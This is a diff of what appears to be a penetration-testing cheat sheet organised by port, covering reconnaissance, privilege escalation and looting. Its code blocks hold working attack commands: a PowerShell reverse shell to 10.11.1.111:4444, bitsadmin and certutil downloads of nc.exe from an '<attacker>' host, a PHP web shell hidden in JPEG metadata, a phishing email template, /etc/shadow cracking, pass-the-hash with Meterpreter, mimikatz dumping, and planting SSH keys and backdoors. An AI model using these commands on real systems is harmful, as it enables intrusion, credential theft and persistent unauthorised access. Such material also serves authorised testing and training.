@@ -1,3 +1,162 @@
+![](https://img.shields.io/github/stars/pandao/editor.md.svg) ![](https://img.shields.io/github/forks/pandao/editor.md.svg)
+
+Table of Contents
+=================
+[TOC]
+
+* [Table of Contents](#table-of-contents)
+* [Recon](#-Recon-:)
+  * [File enumeration](##File-enumeration)
+      * [Common](##Common)
+      * [Disk files](##Disk-files)
+      * [Images](##Images)
+      * [Audio](###Audio)
+  * [Port 7 - Echo tcp/udp](#Port-7---Echo-tcp/udp)
+  * [Port 21 - FTP](#Port-21---FTP)
+  * [Port 22 - SSH](#Port-22---SSH)
+  * [Port 23 - Telnet](#Port-23---Telnet)
+  * [Port 25 - Telnet](#Port-25--Telnet)
+  * [Port 43 - WHOIS](#Port-43---WHOIS)
+  * [Port 53 - DNS](#Port-53---DNS)
+  * [Port 69 - UDP - TFTP](#Port-69---UDP---TFTP)
+  * [Port 79 - Finger](#Port-79---Finger)
+  * [Kerberos - 88](#Kerberos---88)
+  * [Port 110 - POP3](#Port-110---POP3)
+  * [Port 995 / 110 - POP](#Port-995-/-110---POP)
+  * [Port 111 - Rpcbind](#Port-111---Rpcbind)
+  * [Port 113 - Ident](#Port-113---Ident)
+  * [Port 123 - TNP](#Port-123---TNP)
+  * [Port 135 - MSRPC](#Port-135---MSRPC)
+  * [Port 139/445 - SMB](#Port-139/445---SMB)
+  * [Port 143 / 993- IMAP](#Port-143-/-993--IMAP)
+  * [Port 161/162 UDP - SNMP](#Port-161/162-UDP---NMP)
+  * [Port - 194,6667,6660-7000 - IRC](#Port---194,6667,6660-7000---SIRC)
+  * [Port 264 - Check Point FireWall-1](#Port-264---Check-Point-FireWall-1)
+  * [LDAP - 389, 636, 3268, 3269](#LDAP---389,-636,-3268,-3269)
+  * [HTTPS - 443](#HTTPS---443)
+  * [Port 500 -  ISAKMP IPsec/IKE VPN](#Port-500---ISAKMP-IPsec/IKE-VPN)
+  * [Port 502 - Modbus](#Port-502-Modbus)
+  * [Port 512 - Rexec](#Port-512---Rexec)
+  * [Port 513 - Rlogin](#Port-513---Rlogin)
+  * [Port 514 - RSH](#Port-514---RSH)
+  * [Port 515 - line printerdaemon LPd](#Port-515---line-printerdaemon-LPd)
+  * [Port 541 - FortiNet SSLVPN](#541---FortiNet---SLVPN)
+  * [Port 548 - Apple Filing Protocol (AFP)](#Port-548---Apple-Filing-Protocol-(AFP))
+  * [Port 554 - RTSP](#Port-554---RTSP)
+  * [Port 623 / UDP / TCP - IPMI](#Port-623-/-UDP-/-TCP---IPMI)
+  * [Port 631 - Internet Printing Protocol(IPP)](#Port-631---Internet-Printing-Protocol(IPP))
+  * [Port 873 - Rsync](#Port-873---Rsync)
+  * [Port 1026 - Rusersd](#Port-1026---Rusersd)
+  * [Port 1028 / 1099 - Java RMI](#Port-1028-/-1099---Java-RMI)
+  * [Port 1030/1032/1033/1038](#Port-1030/1032/1033/1038)
+  * [MSSQL - 1433](#MSSQL---1433)
+  * [Port 1521 - Oracle](#Port-1521---Oracle)
+  * [Port 1723 - PPTP](#Port-1723---PPTP)
+  * [Port 1883 - MQTT (Mosquitto)](#Port-1883---MQTT (Mosquitto))
+  * [Port 2049 - NFS TNS Listener](#Port-2049---NFS-TNS-Listener)
+  * [Port 2100 - Oracle XML DB](#Port-2100---Oracle-XML-DB)
+  * [Port 3260 - ISCSI](#Port-3260---ISCSI)
+  * [Port 3299 - SAPRouter](#Port-3299---SAPRouter)
+  * [MySQL - 3306](#MySQL---3306)
+  * [Port 3339 - Oracle web interface](#Port-3339---Oracle-web-interface)
+  * [Port 3389 - RDP](#Port-3389---RDP)
+  * [Port 3632 - distcc](#Port-3632---distcc)
+  * [Port 4369 - Erlang Port Mapper Daemon (epmd)](#Port-4369---Erlang-Port-Mapper-Daemon-(epmd))
+  * [Port 5353 / UDP - Multicast DNS (mDNS)](#Port-5353-/-UDP---Multicast-DNS-(mDNS))
+  * [Port 5432 / 5433 -  Postgresql](#Port-5432-/-5433----Postgresql)
+  * [Port 5671 - AMQP](#Port-5671---AMQP)
+  * [Port 5985 / 5986 - WinRM](#Port-5985-/-5986---WinRM)
+  * [VNC - 5800 / 5801 / 5900 / 5901 -  VNC](#VNC---5800-/-5801-/-5900-/-5901----VNC)
+  * [Port 5984 - CouchDB](#Port-5984---CouchDB)
+  * [Port 6000 - X11](#Port-6000---X11)
+  * [Port 8009 - Apache JServ Protocol (AJP)](#Port-8009---Apache-JServ-Protocol-(AJP))
+  * [MsDeploy - 8172](#MsDeploy---8172)
+  * [Webdav](#Webdav)
+  * [Port 9042 / 9160 -  Cassandra](#Port-9042-/-9160---Cassandra)
+  * [Port 9100 - Raw Printing (JetDirect, AppSocket, PDL-datastream)](#Port-9100---Raw-Printing-(JetDirect,-AppSocket,-PDL-datastream))
+  * [Port 9200 - Elasticsearch](#Port-9200---Elasticsearch)
+  * [Port  10000 - Network Data Management Protocol (ndmp)](#Port--10000---Network-Data-Management-Protocol-(ndmp))
+  * [Port 11211 - Memcache](#Port-11211---Memcache)
+  * [Port 15672 - RabbitMQ Management](#Port-15672---RabbitMQ-Management)
+  * [Port 27017 / 27018 - MongoDB](#Port-27017-/-27018---MongoDB)
+  * [Port 44818 / UDP / TCP - EthernetIP](#Port-44818-/-UDP-/-TCP---EthernetIP)
+  * [Port 47808 / udp - BACNet](#Port-47808-/-udp---BACNet)
+  * [Port 50030 / 50060 / 50070 / 50075 / 50090 - Hadoop](#Port-50030-/-50060-/-50070-/-50075-/-50090---Hadoop)
+  * [Unknown ports](#Unknown-ports)
+  * [Port 80 - web server](#Port-80---web-server)
+     * [Url Brutforce](#Url-Brutforce)
+     * [Default_Weak login](#Default_Weak-login)
+     * [LFI-RFI](#LFI-RFI)
+     * [Sql-injection](#Sql-injection)
+     * [XSS](#XSS)
+     * [Sql-login Bypass](#Sql-login-Bypass)
+     * [Bypass img Upload](#Bypass-img-Upload)
+  * [Online crackers](#Onlin-rackers)
+* [Vulnerability analysis](#Vulnerability-analysis)
+    * [Buffer Overflow](#Buffer-Overflow)
+    * [Find xploits - Searchsploit and google](#Find-xploits---Searchsploit-and-google)
+    * [Reverse Sells](#Reverse-Sells)
+* [Privilege escalation](#Privilege-escalation)
+    * [Common](#Common)
+      * [Set up Webserver](#Set-up-Webserver)
+      * [Set up FTP Server](#Set-up-FTP-Server)
+      * [Filet ransfer](#Filet-ransfer)
+    * [Linux](#Linux)
+        * [Basic info](#Basic-info)
+        * [Kernel exploits](#Kernel-exploits)
+        * [Programs running as root](#Programs-running-as-root)
+        * [Installed software](#Installed-software)
+        * [Weak/reused/plaintext passwords](#Weak/reused/plaintext-passwords)
+        * [Inside service](#Inside-service)
+        * [Suid misconfiguration](#Suid-misconfiguration)
+        * [Unmounted filesystems](#Unmounted-filesystems)
+        * [Cronjob](#Cronjob)
+        * [SSH Keys](#SSH-Keys)
+        * [Bad path configuration)](#Bad-path-configuration)
+        * [PS Monitor for cron](#PS-Monitor-for-cron)
+        * [Linux Privesc Tools](#Linux-Privesc-Tools)
+        * [Linux Precompiled Exploits](#Linux-Precompiled-Exploits)
+    * [Windows](#Windows)
+        * [Basic info](#Basic-info)
+        * [Kernel exploits](#Kernel-exploits)
+        * [Cleartext passwords](#Cleartext-passwords)
+        * [Reconfigure service parameters](#Reconfigure-service-parameters)
+        * [Dump process for passwords](#Dump-process-for-passwords)
+        * [Inside service](#Inside-service)
+        * [Programs running as root/system](#Programs-running-as-root/system)
+        * [Installed software](#Installed-software)
+        * [Scheduled tasks](#Scheduled-tasks)
+        * [Weak passwords](#Weak-passwords)
+        * [Add user and enable RDP](#Add-user-and-enable-RDP)
+        * [Powershell sudo for Windows](#Powershell-sudo-for-Windows)
+        * [Windows download with bitsadmin](#Windows-download-with-bitsadmin)
+        * [Windows download with certutil.exe](#Windows-download-with-certutil.exe)
+        * [Creating a wget VB Script on Windows](#Creating-a-wget-VB-Script-on-Windows)
+        * [Windows download with powershell](#Windows-download-with-powershell)
+        * [Windows Download from FTP](#Windows-Download-from-FTP)
+        * [Windows create SMB Server transfer files](#Windows-create-SMB-Server-transfer-files)
+        * [Pass The Hash](#Pass-The-Hash)
+        * [Scripts](#Scripts)
+            * [Useradd](#Useradd)
+            * [Powershell Run As](#Powershell-Run-As)
+            * [Powershell Reverse Shell](#Powershell-Reverse-Shell)
+    * [Loot](#Loot)
+        * [Linux](#Linux)
+            * [Passwords and hashes](#Passwords-and-hashes)
+            * [Dualhomed](#Dualhomed)
+            * [Tcpdump](#Tcpdump)
+            * [Interesting files](#Interesting-files)
+            * [Databases](#Databases)
+            * [SSH-Keys](#SSH-Keys)
+            * [Browser](#Browser)
+            * [Mail](#Mail)
+            * [GUI](#GUI)
+        * [Windows](#Windows)
+            * [Passwords and hashes](#Passwords-and-hashes)
+            * [Dualhomed](#Dualhomed)
+            * [Tcpdump](#Tcpdump)
+            * [Interesting files](#Interesting-files)
+
 # Recon :
 
 ```bash
@@ -86,11 +245,13 @@ binwalk -e file.xxx # Extract
 ```bash
 # Check as binary file in hex
 ghex file.xxx
+
 ```
 
 ```bash
 # Check metadata
 exiftool file.xxx
+
 ```
 
 ```sh
@@ -98,6 +259,7 @@ exiftool file.xxx
 wget https://embeddedsw.net/zip/OpenPuff_release.zip
 unzip OpenPuff_release.zip -d ./OpenPuff
 wine OpenPuff/OpenPuff_release/OpenPuff.exe
+
 ```
 ### Disk files
 
@@ -105,6 +267,7 @@ wine OpenPuff/OpenPuff_release/OpenPuff.exe
 # guestmount can mount any kind of disk file
 sudo apt-get install libguestfs-tools
 guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
+
 ```
 
 ### Images
@@ -237,6 +400,7 @@ nmap -p25 --script smtp-commands $IP
 msf > auxiliary/scanner/smtp/smtp_enum
 smtp-user-enum
 nmap –script smtp-enum-users.nse $IP
+
 ```
 ```bash
 # Send Email from linux console
@@ -251,6 +415,7 @@ IT Dept,
 We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.
 
 Sincerely,
+
 ```
 ### Port 43 - WHOIS
 ```bash
@@ -350,6 +515,7 @@ or:
 
 USER admin
 PASS admin
+
 ```
 ### Port 995 / 110 - POP
 ```bash
@@ -600,6 +766,7 @@ http://www.jxplorer.org/downloads/users.html
 ```
 
 ### HTTPS - 443
+
 - Read the actual SSL CERT to:
     * find out potential correct vhost to GET
     * is the clock skewed
@@ -941,6 +1108,7 @@ iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p
 ```
 
 ### Port 3299 - SAPRouter
+
 Copy of: https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/
 ```bash
 msf> use auxiliary/scanner/sap/sap_service_discovery
@@ -1233,6 +1401,7 @@ redis-cli -h 192.168.0.24
 
 ```
 ### Port 8009 - Apache JServ Protocol (AJP)
+
 Basic Information :
 From: https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/
 ```bash
@@ -1695,7 +1864,7 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg
 
 ```
 
-#Online crackers
+### Online crackers
 
 https://hashkiller.co.uk/Cracker
 https://www.cmd5.org/
@@ -1707,7 +1876,7 @@ https://hash.help/
 https://passwordrecovery.io/
 http://cracker.offensive-security.com/
 
-#### Vulnerability analysis
+# Vulnerability analysis
 
 ## Buffer Overflow
 ```bash
@@ -1959,7 +2128,9 @@ username:root
 username:admin
 username:qwerty
 username:password
+
 ```
+
 ```bash
 ./LinEnum.sh -t -k password
 ```
@@ -1978,6 +2149,7 @@ nano
 curl
 ...
 ```
+
 ```bash
 # SUID
 find / -perm -4000 -type f 2>/dev/null
@@ -2038,6 +2210,7 @@ cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
 
 ```
+
 ### Bad path configuration
 ```bash
 # Require user interaction
@@ -2085,7 +2258,9 @@ done
 [LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)
 
 ### Linux Precompiled Exploits
+
 [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
+
 ## Windows
 
 * Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.
@@ -2220,22 +2395,28 @@ Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{St
 powershell -ExecutionPolicy Bypass -File xyz.ps1
 ```
 ### Windows download with bitsadmin
-```cmd
+```bash
 bitsadmin /transfer mydownloadjob /download /priority normal http://<attacker>/nc.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\nc.exe
+
 ```
 ### Windows download with certutil.exe
 ```bash
 certutil.exe -urlcache -split -f "http://<attacker>/Powerless.bat" Powerless.bat
+
 ```
+
 ### Creating a wget VB Script on Windows
 [*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt)
 
 ### Windows download with powershell
+
 ```bash
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"
 
 (New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
+
 ```
+
 ### Windows Download from FTP
 ```bash
 # In reverse shell
@@ -2248,7 +2429,9 @@ echo bye >> ftp.txt
 
 # Execute
 ftp -v -n -s:ftp.txt
+
 ```
+
 ### Windows create SMB Server transfer files
 ```bash
 # Attack machine
@@ -2283,7 +2466,9 @@ python /usr/share/doc/python-impacket/examples/smbserver.py
 # Victim machine with reverse shell
 Download: copy \\$IP\Lab\wce.exe .
 Upload: copy wtf.jpg \\$IP\Lab
+
 ```
+
 ### Windows download with VBS
 ```cmd
 # In reverse shell
@@ -2315,7 +2500,9 @@ echo ts.Close >> wget.vbs
 
 # Execute
 cscript wget.vbs http://10.11.1.111/file.exe file.exe
+
 ```
+
 ### Pass The Hash
 ```bash
 # Login as user only with hashdump
@@ -2359,7 +2546,9 @@ smbpass => aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7
 msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
 
 payload => windows/x64/meterpreter/reverse_tcp
+
 ```
+
 ### Scripts
 
 #### Useradd
@@ -2376,18 +2565,22 @@ int main ()
 # Compile
 i686-w64-mingw32-gcc -o useradd.exe useradd.c
 ```
+
 #### Powershell Run As
 ```cmd
 echo $username = '<username>' > runas.ps1
 echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
 echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
 echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
+
 ```
+
 #### Powershell Reverse Shell
 ```cmd
 Set-ExecutionPolicy Bypass
 
 $client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
 ```
 ### Windows privesc/enum tools
 - [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
@@ -2397,6 +2590,7 @@ $client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = 
 ### Windows precompiled exploits
 - [WindowsExploits](https://github.com/abatchy17/WindowsExploits)
 ### Windows Port Forwarding
+
 ```sh
 # Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
 # Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
@@ -2404,6 +2598,7 @@ ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
 
 # Run in victim (5985 WinRM):
 plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221
+
 ```
 # Loot :
 ## Linux
@@ -2415,19 +2610,25 @@ cat /etc/shadow
 
 unshadow passwd shadow > unshadowed.txt
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
 ```
+
 ### Dualhomed
 ```bash
 ifconfig
 ifconfig -a
 arp -a
+
 ```
+
 ### Tcpdump
 ```bash
 tcpdump -i any -s0 -w capture.pcap
 tcpdump -i eth0 -w capture -n -U -s 0 src not $IP and dst not $IP
 tcpdump -vv -i eth0 src not $IP and dst not $IP
+
 ```
+
 ### Interesting files
 ```bash
 #Meterpreter
@@ -2443,27 +2644,35 @@ use auxiliary/sniffer/psnuffle
 
 .ssh/
 .bash_history
+
 ```
+
 ### Databases
 ```
 ```
+
 ### SSH-Keys
 ```bash
 mkdir /root/.ssh 2>/dev/null; echo '<your ssh-key>' >> /root/.ssh/authorized_keys
+
 ```
+
 ### Browser
 
 ### Mail
 ```bash
 /var/mail
 /var/spool/mail
+
 ```
+
 ### GUI
 If there is a gui we want to check out the browser.
 ```bash
 echo $DESKTOP_SESSION
 echo $XDG_CURRENT_DESKTOP
 echo $GDMSESSION
+
 ```
 ## Windows
 
@@ -2482,7 +2691,9 @@ reg.exe save hklm\system c:\system
 hashdump
 load mimikatz
 msv
+
 ```
+
 ### Dualhomed
 ```bash
 ipconfig /all
@@ -2490,13 +2701,16 @@ route print
 
 # What other machines have been connected
 arp -a
+
 ```
+
 ### Tcpdump
 ```bash
 # Meterpreter
 run packetrecorder -li
 run packetrecorder -i 1
 ```
+
 ### Interesting files
 ```bash
 #Meterpreter
@@ -2519,4 +2733,5 @@ cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt
 
 # Recursive search
 dir /s
+
 ```
